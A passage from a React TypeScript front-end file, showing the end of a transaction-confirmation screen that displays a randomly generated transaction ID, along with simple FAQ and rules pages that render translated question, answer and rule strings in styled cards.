                        <div className="bg-white/5 border border-white/10 rounded-2xl p-6 mb-8 text-center max-w-md">
                            <p className="text-white/50 text-sm mb-2">Transaction ID</p>
                            <p className="font-mono text-cyan-400 tracking-wider text-xl">#{Math.floor(Math.random()*1000000).toString().padStart(6, '0')}</p>
                        </div>
                        <Button onClick={onBack} className="w-full max-w-xs shadow-green-500/20">
                            {t.back}
                        </Button>
                    </div>
                )}
            </div>
        </div>
    );
};

const FAQPage = ({ t }: any) => (
    <div className="max-w-2xl w-full animate-in fade-in slide-in-from-bottom-10">
        <h1 className="text-4xl font-bold text-center mb-10">{t.faqTitle}</h1>
        <div className="space-y-4">
            {[1,2,3].map(i => (
                <GlassCard key={i} className="p-6">
                    <h3 className="text-xl font-bold mb-2 text-cyan-300">{t[`q${i}`]}</h3>
                    <p className="text-white/60 leading-relaxed">{t[`a${i}`]}</p>
                </GlassCard>
            ))}
        </div>
    </div>
);

const RulesPage = ({ t }: any) => (
    <div className="max-w-2xl w-full animate-in fade-in slide-in-from-bottom-10">
        <h1 className="text-4xl font-bold text-center mb-10">{t.rulesTitle}</h1>
        <GlassCard className="p-8 space-y-6">
            {[1,2,3].map(i => (
                <div key={i} className="flex gap-4">
                    <span className="font-mono text-cyan-500/50">0{i}</span>
                    <p className="text-white/70">{t[`r${i}`]}</p>
                </div>
            ))}
        </GlassCard>
    </div>
);

export default App;
